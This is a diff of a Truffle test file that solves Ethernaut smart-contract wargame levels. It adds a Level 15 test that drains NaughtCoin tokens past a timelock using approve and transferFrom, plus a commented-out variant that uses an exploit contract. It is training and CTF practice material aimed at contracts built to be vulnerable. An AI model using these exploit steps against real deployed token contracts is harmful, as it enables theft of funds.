@@ -21,6 +21,8 @@ const Gatekeeper           = artifacts.require("Gatekeeper");
 const GatekeeperExploit    = artifacts.require("GatekeeperExploit");
 const GatekeeperTwo        = artifacts.require("GatekeeperTwo");
 const GatekeeperTwoExploit = artifacts.require("GatekeeperTwoExploit");
+const NaughtCoin           = artifacts.require("NaughtCoin");
+const NaughtCoinExploit    = artifacts.require("NaughtCoinExploit");
 
 const { expectRevert }     = require('@openzeppelin/test-helpers');
 
@@ -63,7 +65,7 @@ contract("Ethernaut", (accounts) => {
 				const exceptionExpected = "caller is not the owner";
 				assert.equal(exceptionCurrent, exceptionExpected, "Failed to pass level 1.");
 			}
-
+			// another example
 			/*
 			const instance = Fallback.networks["5777"].address;
 			const contract = new web3.eth.Contract(Fallback.abi, instance);
@@ -115,7 +117,7 @@ contract("Ethernaut", (accounts) => {
 			for (let i = 0; i < 10; i++) {
 				await exploit.run(contract.address); // reverse engineer the algorithm to always win
 			}
-			const count = (await web3.utils.toBN(await contract.consecutiveWins())).toString();
+			const count = await web3.utils.toBN(await contract.consecutiveWins());
 			assert.equal(count, 10, "Failed to pass level 3."); // get 10 wins in a row to pass the level
 		});
 	});
@@ -296,6 +298,33 @@ contract("Ethernaut", (accounts) => {
 			const exploit = await GatekeeperTwoExploit.new(contract.address, { from: hacker }); // use a proxy contract and constructor method to bypass gateOne(), gateTwo(), and gateThree() modifiers
 			const entrantCurrent = await contract.entrant();
 			assert.equal(hacker, entrantCurrent, "Failed to pass level 14."); // become the entrant to pass the level
+		});
+	});
+
+	describe("Level 15 - NaughtCoin", async () => {
+		it("Deploy NaughtCoin and NaughtCoinExploit Contracts", async () => {
+			let deployed = await NaughtCoin.deployed();
+			assert(deployed, "NaughtCoin contract is not deployed.");
+			deployed = await NaughtCoinExploit.deployed();
+			assert(deployed, "NaughtCoinExploit contract is not deployed.");
+		});
+		it("Exploit", async () => {
+			const contract = await NaughtCoin.new(owner);
+			const balanceCurrent = await contract.balanceOf(owner);
+			await contract.approve(hacker, balanceCurrent); // publicly available and unprotected ERC20 method, approve hacker to spend crypto
+			await contract.transferFrom(owner, hacker, balanceCurrent, {from: hacker});
+			const balanceNew = await contract.balanceOf(owner);
+			assert.equal(balanceNew, 0, "Failed to pass level 15."); // make the target's balance zero to pass the level
+			// another example using an exploit contract
+			/*
+			const contract = await NaughtCoin.new(owner);
+			const exploit = await NaughtCoinExploit.new();
+			const balanceCurrent = await contract.balanceOf(owner);
+			await contract.approve(exploit.address, balanceCurrent);
+			await exploit.run(contract.address, owner, balanceCurrent);
+			const balanceNew = await contract.balanceOf(owner);
+			assert.equal(balanceNew, 0, "Failed to pass level 15.");
+			*/
 		});
 	});
 });
